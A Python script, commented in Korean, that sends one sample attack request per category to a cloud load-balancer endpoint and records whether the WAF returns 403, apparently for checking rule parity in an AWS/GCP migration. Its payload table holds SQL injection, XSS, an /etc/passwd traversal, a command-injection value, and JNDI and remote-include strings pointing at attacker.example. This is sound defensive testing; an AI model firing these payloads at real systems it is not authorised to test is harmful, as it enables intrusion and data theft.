#!/usr/bin/env python3
"""클라우드 입구에 범주별 시험 공격을 보내 막혔는지 기록한다. 결과는 migration_parity 의 attack_results 다.

403 만 차단으로 본다. 앱이 응답(2xx·4xx)하면 통과(allowed), 연결 실패·5xx 는 모른다(unknown).
"""

from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Callable, Iterable
from pathlib import Path

TIMEOUT_SECONDS = 5
BLOCKED_STATUS = 403
# 같은 범주의 대표 요청 하나씩. 탐지 품질 시험이 아니라 "그 범주를 막는 규칙이 켜졌는가"만 본다
PAYLOADS: dict[str, str] = {
    "sqli": "id=1' OR '1'='1",
    "xss": "q=<script>alert(1)</script>",
    "lfi": "file=../../etc/passwd",
    "rfi": "url=http://attacker.example/shell.txt",
    "java": "q=${jndi:ldap://attacker.example/a}",
    "cve": "q=${jndi:ldap://attacker.example/b}",
    "rce": "cmd=x;cat /etc/passwd",
    "php": "q=<?php phpinfo(); ?>",
}


def scenario_name(capability: str) -> str:
    return f"{capability}-probe"


def observed_for(status: int) -> str:
    if status == BLOCKED_STATUS:
        return "blocked"
    if 200 <= status < 500:
        return "allowed"
    return "unknown"


def fetch_status(url: str) -> int:
    try:
        with urllib.request.urlopen(url, timeout=TIMEOUT_SECONDS) as response:
            return response.status
    except urllib.error.HTTPError as exc:
        return exc.code
    except (urllib.error.URLError, TimeoutError, OSError):
        return 0


def attack_url(base: str, capability: str) -> str:
    return f"{base}?{urllib.parse.quote(PAYLOADS[capability], safe='=')}"


def probe(base_url: str, environment: str, capabilities: Iterable[str], *,
          fetch: Callable[[str], int] = fetch_status) -> list[dict]:
    results = []
    for capability in sorted(set(capabilities)):
        if capability not in PAYLOADS:
            results.append({"scenario": scenario_name(capability), "environment": environment, "observed": "unknown"})
            continue
        status = fetch(attack_url(base_url, capability))
        results.append({"scenario": scenario_name(capability), "environment": environment,
                        "observed": observed_for(status), "http_status": status or None})
    return results


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="입구의 앱 경로. 예: http://haproxy:8202/api/hello")
    parser.add_argument("--environment", choices=("aws", "gcp"), required=True)
    parser.add_argument("--capabilities", required=True)
    parser.add_argument("--out", type=Path, required=True)
    args = parser.parse_args(argv)
    results = probe(args.url, args.environment, [c for c in args.capabilities.split(",") if c])
    args.out.write_text(json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8")
    for result in results:
        print(f"{result['environment']} {result['scenario']}: {result['observed']} (HTTP {result.get('http_status')})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
